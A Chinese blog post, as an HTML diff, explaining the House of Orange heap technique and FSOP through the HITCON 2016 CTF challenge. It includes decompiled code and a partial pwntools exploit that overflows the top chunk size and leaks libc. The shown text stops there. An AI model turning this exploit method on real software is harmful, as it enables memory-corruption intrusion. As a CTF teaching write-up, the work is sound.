@@ -1,0 +1,296 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-tldeq5d5><head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="color-scheme" content="light"><meta name="theme-color" content="#fbf9f5"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32.png"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="sitemap" href="/sitemap-index.xml"><meta name="generator" content="Astro v7.4.2"><meta name="author" content="Findkey"><!-- Canonical URL --><link rel="canonical" href="https://find-key.github.io/posts/orange/"><!-- Primary Meta Tags --><title>House of orange · Findkey’s Blog</title><meta name="description" content="申请大于 top chunk 时，top chunk 会被放进 unsorted bin；再配合 unsorted bin attack 覆写 _IO_list_all，伪造 _IO_FILE_plus 走 FSOP。"><!-- Open Graph / Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://find-key.github.io/posts/orange/"><meta property="og:site_name" content="Findkey’s Blog"><meta property="og:locale" content="zh_CN"><meta property="og:title" content="House of orange · Findkey’s Blog"><meta property="og:description" content="申请大于 top chunk 时，top chunk 会被放进 unsorted bin；再配合 unsorted bin attack 覆写 _IO_list_all，伪造 _IO_FILE_plus 走 FSOP。"><meta property="og:image" content="https://find-key.github.io/og.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="House of orange · Findkey’s Blog"><meta name="twitter:description" content="申请大于 top chunk 时，top chunk 会被放进 unsorted bin；再配合 unsorted bin attack 覆写 _IO_list_all，伪造 _IO_FILE_plus 走 FSOP。"><meta name="twitter:image" content="https://find-key.github.io/og.png"><link rel="stylesheet" href="/_astro/_..YMHo4NxU.css"><link rel="stylesheet" href="/_astro/Header.Cvwz3oM9.css"><script type="module" src="/_astro/page.tougUCvb.js"></script></head><body data-astro-cid-tldeq5d5><header class="site-header" data-astro-cid-nen7h5rs><div class="inner" data-astro-cid-nen7h5rs><a class="brand" href="/" data-astro-cid-nen7h5rs>Findkey’s Blog</a><nav class="nav" data-astro-cid-nen7h5rs><a href="/posts" class="active" data-astro-cid-nen7h5rs>归档</a><a href="/links" data-astro-cid-nen7h5rs>友链</a></nav></div></header><main class="wrap" data-astro-cid-tldeq5d5><div class="grid" data-astro-cid-tldeq5d5><aside class="sidebar" data-astro-cid-7k3pnqyz><span class="label" data-astro-cid-7k3pnqyz>目录</span><ol class="toc" data-astro-cid-7k3pnqyz><li class="d2" data-astro-cid-7k3pnqyz><a href="#前言" data-heading="前言" data-astro-cid-7k3pnqyz>前言</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#house-of-orange" data-heading="house-of-orange" data-astro-cid-7k3pnqyz>House of orange</a></li><li class="d3" data-astro-cid-7k3pnqyz><a href="#条件" data-heading="条件" data-astro-cid-7k3pnqyz>条件</a></li><li class="d3" data-astro-cid-7k3pnqyz><a href="#利用" data-heading="利用" data-astro-cid-7k3pnqyz>利用</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#fsop" data-heading="fsop" data-astro-cid-7k3pnqyz>FSOP</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#示例" data-heading="示例" data-astro-cid-7k3pnqyz>示例</a></li><li class="d3" data-astro-cid-7k3pnqyz><a href="#hitcon-2016-house-of-orange" data-heading="hitcon-2016-house-of-orange" data-astro-cid-7k3pnqyz>HITCON 2016 house of orange</a></li><li class="d3" data-astro-cid-7k3pnqyz><a href="#后记" data-heading="后记" data-astro-cid-7k3pnqyz>后记</a></li></ol></aside><script type="module">var e=new Map;document.querySelectorAll(`a[data-heading]`).forEach(t=>{let n=t.dataset.heading;if(!n)return;let r=e.get(n)??[];r.push(t),e.set(n,r)});var t=Array.from(document.querySelectorAll(`.prose h2[id], .prose h3[id]`));if(document.querySelectorAll(`.toc-inline a[data-heading]`).forEach(e=>{e.addEventListener(`click`,()=>{let t=e.closest(`details`);t&&(t.open=!1)})}),e.size>0&&t.length>0){let n=new IntersectionObserver(t=>{for(let n of t)n.isIntersecting&&(e.forEach(e=>e.forEach(e=>e.classList.remove(`active`))),e.get(n.target.id)?.forEach(e=>e.classList.add(`active`)))},{rootMargin:`-84px 0px -65% 0px`});t.forEach(e=>n.observe(e))}</script><article class="article" data-astro-cid-tldeq5d5><nav class="crumb" aria-label="位置" data-astro-cid-tldeq5d5><a href="/" data-astro-cid-tldeq5d5>首页</a><span class="sep" data-astro-cid-tldeq5d5>/</span><a href="/categories/pwn/" data-astro-cid-tldeq5d5>pwn</a></nav><h1 data-astro-cid-tldeq5d5>House of orange</h1><p class="meta" data-astro-cid-tldeq5d5><time datetime="2025-03-10">2025年3月10日</time><span class="dot" data-astro-cid-tldeq5d5>·</span><span data-astro-cid-tldeq5d5>约 14 分钟</span></p><div class="tags" data-astro-cid-tldeq5d5><a href="/tags/io-file/" data-astro-cid-tldeq5d5>#io-file</a></div><details class="toc-inline" data-astro-cid-7k3pnqyz><summary data-astro-cid-7k3pnqyz>目录</summary><ol class="toc" data-astro-cid-7k3pnqyz><li class="d2" data-astro-cid-7k3pnqyz><a href="#前言" data-heading="前言" data-astro-cid-7k3pnqyz>前言</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#house-of-orange" data-heading="house-of-orange" data-astro-cid-7k3pnqyz>House of orange</a></li><li class="d3" data-astro-cid-7k3pnqyz><a href="#条件" data-heading="条件" data-astro-cid-7k3pnqyz>条件</a></li><li class="d3" data-astro-cid-7k3pnqyz><a href="#利用" data-heading="利用" data-astro-cid-7k3pnqyz>利用</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#fsop" data-heading="fsop" data-astro-cid-7k3pnqyz>FSOP</a></li><li class="d2" data-astro-cid-7k3pnqyz><a href="#示例" data-heading="示例" data-astro-cid-7k3pnqyz>示例</a></li><li class="d3" data-astro-cid-7k3pnqyz><a href="#hitcon-2016-house-of-orange" data-heading="hitcon-2016-house-of-orange" data-astro-cid-7k3pnqyz>HITCON 2016 house of orange</a></li><li class="d3" data-astro-cid-7k3pnqyz><a href="#后记" data-heading="后记" data-astro-cid-7k3pnqyz>后记</a></li></ol></details><div class="prose" data-astro-cid-tldeq5d5><h2 id="前言">前言</h2>
+<p>久仰 <strong>house of orange</strong> 大名，真研究下来发现并不算难；FSOP 是第一次接触，思路很惊艳。</p>
+<h2 id="house-of-orange">House of orange</h2>
+<h3 id="条件">条件</h3>
+<p>只有一个：<strong>能改到 <code>top chunk</code> 的 <code>size</code> 字段</strong>（堆溢出、越界写都行）。</p>
+<h3 id="利用">利用</h3>
+<p>把 <code>top chunk</code> 的 <code>size</code> 改小之后，再申请一个比它大的 chunk，<code>malloc</code> 会认为 top 不够用，于是：</p>
+<ol>
+<li>把这块 <code>top chunk</code> 链进 <code>unsorted bin</code>；</li>
+<li>用 <code>mmap</code> 重新要一块新的 top。</li>
+</ol>
+<p>到这一步，<code>unsorted bin</code> 里就躺着一个 size 被我们改过的 chunk。接下来只要在合适的时机触发 <code>malloc</code>，<code>unsorted bin</code> 的整理逻辑就会按 size 把它归到对应的 <code>small bin</code>／<code>large bin</code>，链表的指针也随之被我们左右。</p>
+<h2 id="fsop">FSOP</h2>
+<p>核心是把 <code>_IO_list_all</code> 劫持到伪造的 <code>_IO_FILE_plus</code> 上：<code>_IO_flush_all_lockp</code> 会沿着 <code>_IO_list_all</code> 遍历这条 <code>_IO_FILE</code> 链表，对每个结构调用它 <code>vtable</code> 里的 <code>_IO_OVERFLOW</code>。所以只要让遍历走到一个由我们控制的伪造结构，并且把它的 vtable 换掉（比如指向 <code>_IO_str_jumps</code> 附近，让 <code>_IO_OVERFLOW</code> 落到 <code>system</code>），就能拿到执行流。</p>
+<p><code>_IO_flush_all_lockp</code> 会在三种情况下被触发：</p>
+<ul>
+<li>执行 <code>abort</code> 流程时</li>
+<li>执行 <code>exit()</code> 函数时</li>
+<li>正常结束 <code>main()</code> 函数（本质上就是情况二）</li>
+</ul>
+<h2 id="示例">示例</h2>
+<h3 id="hitcon-2016-house-of-orange">HITCON 2016 house of orange</h3>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="C"><code><span class="line"><span style="color:#D73A49">void</span><span style="color:#24292E"> __fastcall __noreturn </span><span style="color:#6F42C1">main</span><span style="color:#24292E">(__int64 </span><span style="color:#E36209">a1</span><span style="color:#24292E">, </span><span style="color:#D73A49">char</span><span style="color:#D73A49"> **</span><span style="color:#E36209">a2</span><span style="color:#24292E">, </span><span style="color:#D73A49">char</span><span style="color:#D73A49"> **</span><span style="color:#E36209">a3</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">{</span></span>
+<span class="line"><span style="color:#D73A49">  int</span><span style="color:#24292E"> v3;</span><span style="color:#6A737D">      // eax</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">  int</span><span style="color:#24292E">(a1, a2, a3);</span></span>
+<span class="line"><span style="color:#D73A49">  while</span><span style="color:#24292E"> ( </span><span style="color:#005CC5">1</span><span style="color:#24292E"> )</span></span>
+<span class="line"><span style="color:#24292E">  {</span></span>
+<span class="line"><span style="color:#D73A49">    while</span><span style="color:#24292E"> ( </span><span style="color:#005CC5">1</span><span style="color:#24292E"> )</span></span>
+<span class="line"><span style="color:#24292E">    {</span></span>
+<span class="line"><span style="color:#6F42C1">      menu</span><span style="color:#24292E">();</span><span style="color:#6A737D">  //   puts("+++++++++++++++++++++++++++++++++++++");</span></span>
+<span class="line"><span style="color:#6A737D">               //   puts("@          House of Orange          @");</span></span>
+<span class="line"><span style="color:#6A737D">               //   puts("+++++++++++++++++++++++++++++++++++++");</span></span>
+<span class="line"><span style="color:#6A737D">               //   puts(" 1. Build the house                  ");</span></span>
+<span class="line"><span style="color:#6A737D">               //   puts(" 2. See the house                    ");</span></span>
+<span class="line"><span style="color:#6A737D">               //   puts(" 3. Upgrade the house                ");</span></span>
+<span class="line"><span style="color:#6A737D">               //   puts(" 4. Give up                          ");</span></span>
+<span class="line"><span style="color:#6A737D">               //   puts("+++++++++++++++++++++++++++++++++++++");</span></span>
+<span class="line"><span style="color:#6A737D">               //   return printf("Your choice : ");</span></span>
+<span class="line"><span style="color:#24292E">      v3 </span><span style="color:#D73A49">=</span><span style="color:#6F42C1"> getc</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#D73A49">      if</span><span style="color:#24292E"> ( v3 </span><span style="color:#D73A49">!=</span><span style="color:#005CC5"> 2</span><span style="color:#24292E"> )</span></span>
+<span class="line"><span style="color:#D73A49">        break</span><span style="color:#24292E">;</span></span>
+<span class="line"><span style="color:#6F42C1">      see</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#24292E">    }</span></span>
+<span class="line"><span style="color:#D73A49">    if</span><span style="color:#24292E"> ( v3 </span><span style="color:#D73A49">></span><span style="color:#005CC5"> 2</span><span style="color:#24292E"> )</span></span>
+<span class="line"><span style="color:#24292E">    {</span></span>
+<span class="line"><span style="color:#D73A49">      if</span><span style="color:#24292E"> ( v3 </span><span style="color:#D73A49">==</span><span style="color:#005CC5"> 3</span><span style="color:#24292E"> )</span></span>
+<span class="line"><span style="color:#24292E">      {</span></span>
+<span class="line"><span style="color:#6F42C1">        upgrade</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#24292E">      }</span></span>
+<span class="line"><span style="color:#D73A49">      else</span></span>
+<span class="line"><span style="color:#24292E">      {</span></span>
+<span class="line"><span style="color:#D73A49">        if</span><span style="color:#24292E"> ( v3 </span><span style="color:#D73A49">==</span><span style="color:#005CC5"> 4</span><span style="color:#24292E"> )</span></span>
+<span class="line"><span style="color:#24292E">        {</span></span>
+<span class="line"><span style="color:#6F42C1">          puts</span><span style="color:#24292E">(</span><span style="color:#032F62">"give up"</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#6F42C1">          exit</span><span style="color:#24292E">(</span><span style="color:#005CC5">0</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">        }</span></span>
+<span class="line"><span style="color:#24292E">LABEL_13:</span></span>
+<span class="line"><span style="color:#6F42C1">        puts</span><span style="color:#24292E">(</span><span style="color:#032F62">"Invalid choice"</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">      }</span></span>
+<span class="line"><span style="color:#24292E">    }</span></span>
+<span class="line"><span style="color:#D73A49">    else</span></span>
+<span class="line"><span style="color:#24292E">    {</span></span>
+<span class="line"><span style="color:#D73A49">      if</span><span style="color:#24292E"> ( v3 </span><span style="color:#D73A49">!=</span><span style="color:#005CC5"> 1</span><span style="color:#24292E"> )</span></span>
+<span class="line"><span style="color:#D73A49">        goto</span><span style="color:#24292E"> LABEL_13;</span></span>
+<span class="line"><span style="color:#6F42C1">      build</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#24292E">    }</span></span>
+<span class="line"><span style="color:#24292E">  }n</span></span>
+<span class="line"><span style="color:#24292E">}</span></span></code></pre>
+<h4 id="漏洞分析">漏洞分析</h4>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="C"><code><span class="line"><span style="color:#D73A49">int</span><span style="color:#6F42C1"> upgrade</span><span style="color:#24292E">()</span></span>
+<span class="line"><span style="color:#24292E">{</span></span>
+<span class="line"><span style="color:#24292E">  aaa </span><span style="color:#D73A49">*</span><span style="color:#24292E">one;</span><span style="color:#6A737D">         // rbx</span></span>
+<span class="line"><span style="color:#D73A49">  unsigned</span><span style="color:#D73A49"> int</span><span style="color:#24292E"> v2;</span><span style="color:#6A737D">  // [rsp+8h] [rbp-18h]</span></span>
+<span class="line"><span style="color:#D73A49">  int</span><span style="color:#24292E"> v3;</span><span style="color:#6A737D">           // [rsp+Ch] [rbp-14h]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">  if</span><span style="color:#24292E"> ( chance </span><span style="color:#D73A49">></span><span style="color:#005CC5"> 2</span><span style="color:#D73A49">u</span><span style="color:#24292E"> )</span></span>
+<span class="line"><span style="color:#D73A49">    return</span><span style="color:#6F42C1"> puts</span><span style="color:#24292E">(</span><span style="color:#032F62">"You can't upgrade more"</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#D73A49">  if</span><span style="color:#24292E"> ( </span><span style="color:#D73A49">!</span><span style="color:#24292E">tmp )</span></span>
+<span class="line"><span style="color:#D73A49">    return</span><span style="color:#6F42C1"> puts</span><span style="color:#24292E">(</span><span style="color:#032F62">"No such house !"</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#6F42C1">  printf</span><span style="color:#24292E">(</span><span style="color:#032F62">"Length of name :"</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">  v2 </span><span style="color:#D73A49">=</span><span style="color:#6F42C1"> getc</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#D73A49">  if</span><span style="color:#24292E"> ( v2 </span><span style="color:#D73A49">></span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">1000</span><span style="color:#24292E"> )</span></span>
+<span class="line"><span style="color:#24292E">    v2 </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> 4096</span><span style="color:#24292E">;</span></span>
+<span class="line"><span style="color:#6F42C1">  printf</span><span style="color:#24292E">(</span><span style="color:#032F62">"Name:"</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#6F42C1">  readsth</span><span style="color:#24292E">(tmp->name, v2);</span></span>
+<span class="line"><span style="color:#6F42C1">  printf</span><span style="color:#24292E">(</span><span style="color:#032F62">"Price of Orange: "</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">  one </span><span style="color:#D73A49">=</span><span style="color:#24292E"> tmp->one;</span></span>
+<span class="line"><span style="color:#24292E">  one->price </span><span style="color:#D73A49">=</span><span style="color:#6F42C1"> getc</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#6F42C1">  putsth</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#6F42C1">  printf</span><span style="color:#24292E">(</span><span style="color:#032F62">"Color of Orange: "</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">  v3 </span><span style="color:#D73A49">=</span><span style="color:#6F42C1"> getc</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#D73A49">  if</span><span style="color:#24292E"> ( v3 </span><span style="color:#D73A49">!=</span><span style="color:#005CC5"> 56746</span><span style="color:#D73A49"> &#x26;&#x26;</span><span style="color:#24292E"> (v3 </span><span style="color:#D73A49">&#x3C;=</span><span style="color:#005CC5"> 0</span><span style="color:#D73A49"> ||</span><span style="color:#24292E"> v3 </span><span style="color:#D73A49">></span><span style="color:#005CC5"> 7</span><span style="color:#24292E">) )</span></span>
+<span class="line"><span style="color:#24292E">  {</span></span>
+<span class="line"><span style="color:#6F42C1">    puts</span><span style="color:#24292E">(</span><span style="color:#032F62">"No such color"</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#6F42C1">    exit</span><span style="color:#24292E">(</span><span style="color:#005CC5">1</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">  }</span></span>
+<span class="line"><span style="color:#D73A49">  if</span><span style="color:#24292E"> ( v3 </span><span style="color:#D73A49">==</span><span style="color:#005CC5"> 56746</span><span style="color:#24292E"> )</span></span>
+<span class="line"><span style="color:#24292E">    tmp->one->color </span><span style="color:#D73A49">=</span><span style="color:#005CC5"> 56746</span><span style="color:#24292E">;</span></span>
+<span class="line"><span style="color:#D73A49">  else</span></span>
+<span class="line"><span style="color:#24292E">    tmp->one->color </span><span style="color:#D73A49">=</span><span style="color:#24292E"> v3 </span><span style="color:#D73A49">+</span><span style="color:#005CC5"> 30</span><span style="color:#24292E">;</span></span>
+<span class="line"><span style="color:#D73A49">  ++</span><span style="color:#24292E">chance;</span></span>
+<span class="line"><span style="color:#D73A49">  return</span><span style="color:#6F42C1"> puts</span><span style="color:#24292E">(</span><span style="color:#032F62">"Finish"</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">}</span></span></code></pre>
+<p><code>upgrade()</code> 会再读一次 name 的长度，用的却是攻击者自己填的 size，没有和申请时的大小比对——这就给了堆溢出，也是整条利用链的入口。</p>
+<h4 id="exp">exp</h4>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#D73A49">from</span><span style="color:#24292E"> pwn </span><span style="color:#D73A49">import</span><span style="color:#D73A49"> *</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">context.log_level </span><span style="color:#D73A49">=</span><span style="color:#032F62"> 'debug'</span></span>
+<span class="line"><span style="color:#24292E">context.terminal </span><span style="color:#D73A49">=</span><span style="color:#24292E"> [</span><span style="color:#032F62">'tmux'</span><span style="color:#24292E">, </span><span style="color:#032F62">'splitw'</span><span style="color:#24292E">, </span><span style="color:#032F62">'-h'</span><span style="color:#24292E">]</span></span>
+<span class="line"><span style="color:#24292E">context.arch </span><span style="color:#D73A49">=</span><span style="color:#032F62"> 'amd64'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">libc </span><span style="color:#D73A49">=</span><span style="color:#24292E"> ELF(</span><span style="color:#032F62">'./libc-2.23.so'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io </span><span style="color:#D73A49">=</span><span style="color:#24292E"> process(</span><span style="color:#032F62">'./houseoforange_hitcon_2016'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">gdb.attach(io, </span><span style="color:#032F62">'b *$rebase(0x13C6)'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">def</span><span style="color:#6F42C1"> cmd</span><span style="color:#24292E">(c: </span><span style="color:#005CC5">int</span><span style="color:#24292E">):</span></span>
+<span class="line"><span style="color:#24292E">    io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'Your choice : '</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    io.sendline(</span><span style="color:#005CC5">str</span><span style="color:#24292E">(c).encode())</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">def</span><span style="color:#6F42C1"> build</span><span style="color:#24292E">(length: </span><span style="color:#005CC5">int</span><span style="color:#24292E">, name: </span><span style="color:#005CC5">bytes</span><span style="color:#24292E">, price: </span><span style="color:#005CC5">int</span><span style="color:#D73A49"> =</span><span style="color:#005CC5"> 1</span><span style="color:#24292E">, color: </span><span style="color:#005CC5">int</span><span style="color:#D73A49"> =</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">DDAA</span><span style="color:#24292E">):</span></span>
+<span class="line"><span style="color:#24292E">    cmd(</span><span style="color:#005CC5">1</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'Length of name :'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    io.sendline(</span><span style="color:#005CC5">str</span><span style="color:#24292E">(length).encode())</span></span>
+<span class="line"><span style="color:#24292E">    io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'Name :'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    io.send(name)</span></span>
+<span class="line"><span style="color:#24292E">    io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'Price of Orange:'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    io.sendline(</span><span style="color:#005CC5">str</span><span style="color:#24292E">(price).encode())</span></span>
+<span class="line"><span style="color:#24292E">    io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'Color of Orange:'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    io.sendline(</span><span style="color:#005CC5">str</span><span style="color:#24292E">(color).encode())</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">def</span><span style="color:#6F42C1"> see</span><span style="color:#24292E">():</span></span>
+<span class="line"><span style="color:#24292E">    cmd(</span><span style="color:#005CC5">2</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">def</span><span style="color:#6F42C1"> upgrade</span><span style="color:#24292E">(length: </span><span style="color:#005CC5">int</span><span style="color:#24292E">, name: </span><span style="color:#005CC5">bytes</span><span style="color:#24292E">, price: </span><span style="color:#005CC5">int</span><span style="color:#D73A49"> =</span><span style="color:#005CC5"> 1</span><span style="color:#24292E">, color: </span><span style="color:#005CC5">int</span><span style="color:#D73A49"> =</span><span style="color:#D73A49"> 0x</span><span style="color:#005CC5">DDAA</span><span style="color:#24292E">):</span></span>
+<span class="line"><span style="color:#24292E">    cmd(</span><span style="color:#005CC5">3</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'Length of name :'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    io.sendline(</span><span style="color:#005CC5">str</span><span style="color:#24292E">(length).encode())</span></span>
+<span class="line"><span style="color:#24292E">    io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'Name:'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    io.send(name)</span></span>
+<span class="line"><span style="color:#24292E">    io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'Price of Orange: '</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    io.sendline(</span><span style="color:#005CC5">str</span><span style="color:#24292E">(price).encode())</span></span>
+<span class="line"><span style="color:#24292E">    io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'Color of Orange: '</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">    io.sendline(</span><span style="color:#005CC5">str</span><span style="color:#24292E">(color).encode())</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">build(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">10</span><span style="color:#24292E">, </span><span style="color:#D73A49">b</span><span style="color:#032F62">'a'</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">extend </span><span style="color:#D73A49">=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'a'</span><span style="color:#D73A49">*0x</span><span style="color:#005CC5">10</span></span>
+<span class="line"><span style="color:#24292E">extend </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#005CC5">0</span><span style="color:#24292E">) </span><span style="color:#D73A49">+</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">21</span><span style="color:#24292E">) </span><span style="color:#D73A49">+</span><span style="color:#24292E"> p32(</span><span style="color:#005CC5">1</span><span style="color:#24292E">) </span><span style="color:#D73A49">+</span><span style="color:#24292E"> p32(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">DDAA</span><span style="color:#24292E">) </span><span style="color:#D73A49">+</span><span style="color:#24292E"> p64(</span><span style="color:#005CC5">0</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">extend </span><span style="color:#D73A49">+=</span><span style="color:#24292E"> p64(</span><span style="color:#005CC5">0</span><span style="color:#24292E">) </span><span style="color:#D73A49">+</span><span style="color:#24292E"> p64(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">fa1</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#032F62">0xfa1是通过第一次分配的堆块的大小来计算的,0x20</span></span>
+<span class="line"><span style="color:#032F62">正常不覆盖大小应该是0x20fa1</span></span>
+<span class="line"><span style="color:#032F62">之所以这样是为了绕过检测</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">upgrade(</span><span style="color:#005CC5">len</span><span style="color:#24292E">(extend), extend)</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#032F62">此时top chunk的大小就被覆盖为0xfa1了</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">build(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">1000</span><span style="color:#24292E">, </span><span style="color:#D73A49">b</span><span style="color:#032F62">'junk'</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#032F62">触发 house of orange</span></span>
+<span class="line"><span style="color:#032F62">将top chunk放入unsorted bin</span></span>
+<span class="line"><span style="color:#032F62">因为申请的chunk大小为0x1000,而top chunk的大小只有0xfa1</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">build(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">400</span><span style="color:#24292E">, </span><span style="color:#D73A49">b</span><span style="color:#032F62">'c'</span><span style="color:#D73A49">*</span><span style="color:#005CC5">8</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#032F62">malloc并不会清理chunk的内容</span></span>
+<span class="line"><span style="color:#032F62">所以,可以泄露libc内容</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">see()</span></span>
+<span class="line"><span style="color:#24292E">io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'c'</span><span style="color:#D73A49">*</span><span style="color:#005CC5">8</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">libc_base </span><span style="color:#D73A49">=</span><span style="color:#24292E"> u64(io.recvuntil(</span><span style="color:#D73A49">b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\x7f</span><span style="color:#032F62">'</span><span style="color:#24292E">)[</span><span style="color:#D73A49">-</span><span style="color:#005CC5">6</span><span style="color:#24292E">:].ljust(</span><span style="color:#005CC5">8</span><span style="color:#24292E">, </span><span style="color:#D73A49">b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\0</span><span style="color:#032F62">'</span><span style="color:#24292E">))</span><span style="color:#D73A49">-0x</span><span style="color:#005CC5">3c5188</span></span>
+<span class="line"><span style="color:#24292E">log.success(</span><span style="color:#032F62">'libc_base: '</span><span style="color:#D73A49"> +</span><span style="color:#005CC5"> hex</span><span style="color:#24292E">(libc_base))</span></span>
+<span class="line"><span style="color:#005CC5">IO_list_all</span><span style="color:#D73A49"> =</span><span style="color:#24292E"> libc_base </span><span style="color:#D73A49">+</span><span style="color:#24292E"> libc.sym[</span><span style="color:#032F62">'_IO_list_all'</span><span style="color:#24292E">]</span></span>
+<span class="line"><span style="color:#24292E">log.success(</span><span style="color:#032F62">'IO_list_all: '</span><span style="color:#D73A49"> +</span><span style="color:#005CC5"> hex</span><span style="color:#24292E">(</span><span style="color:#005CC5">IO_list_all</span><span style="color:#24292E">))</span></span>
+<span class="line"><span style="color:#24292E">system </span><span style="color:#D73A49">=</span><span style="color:#24292E"> libc_base </span><span style="color:#D73A49">+</span><span style="color:#24292E"> libc.sym[</span><span style="color:#032F62">'system'</span><span style="color:#24292E">]</span></span>
+<span class="line"><span style="color:#24292E">log.success(</span><span style="color:#032F62">'system: '</span><span style="color:#D73A49"> +</span><span style="color:#005CC5"> hex</span><span style="color:#24292E">(system))</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#032F62">泄露libc</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
